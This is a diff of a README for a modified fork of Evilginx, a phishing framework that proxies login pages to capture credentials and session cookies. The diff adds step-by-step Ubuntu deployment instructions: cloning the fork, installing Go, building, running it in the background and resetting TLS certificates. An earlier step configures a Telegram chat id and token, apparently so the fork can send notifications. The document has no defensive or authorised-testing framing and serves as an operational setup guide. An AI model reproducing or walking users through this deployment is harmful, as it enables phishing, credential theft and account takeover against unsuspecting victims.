@@ -1,11 +1,63 @@
 # Evilginx 3.0
 ```
-- git clone https://github.com/fluxxset/evilginx2.git
-- cd evilginx2
+- git clone https://github.com/larryomakh/evilginx_modified_telegram_notifications.git
+- cd evilginx_modified_telegram_notifications
 - ./evilginx2 # and exit
 - nano /root/.evilginx/config.json ## add chatid and teletoken and save and exit
 - ./evilginx2
 ```
+
+---
+
+## 🖥️ Deploying on Ubuntu Server
+
+**1. Clone the repository:**
+```sh
+git clone https://github.com/larryomakh/evilginx_modified_telegram_notifications.git
+cd evilginx_modified_telegram_notifications
+```
+
+**2. Make sure Go 1.22+ is installed:**
+```sh
+go version  # Should show go1.22.x or newer
+```
+If you see an older version, upgrade Go:
+```sh
+rm -rf /usr/local/go
+wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
+tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
+export PATH=/usr/local/go/bin:$PATH
+echo 'export PATH=/usr/local/go/bin:$PATH' >> ~/.profile
+source ~/.profile
+go version
+```
+
+**3. Build and run Evilginx:**
+```sh
+go build -o evilginx2 .
+./evilginx2
+```
+
+**4. Running in the background:**
+```sh
+nohup ./evilginx2 > evilginx2.log 2>&1 &
+```
+
+---
+
+## ⚠️ TLS Certificate Troubleshooting
+If you see this error:
+```
+[!!!] certdb: tls: private key does not match public key
+```
+- Evilginx is trying to load a mismatched TLS certificate and private key from `/root/.evilginx`.
+- To fix, delete the files in `/root/.evilginx` and restart Evilginx:
+```sh
+rm -rf /root/.evilginx/*
+./evilginx2
+```
+- Evilginx will attempt to generate/request new certificates.
+
 ---
 Big Thanks to [kgretzky](https://github.com/kgretzky/) for Creating such great tool  
 ---
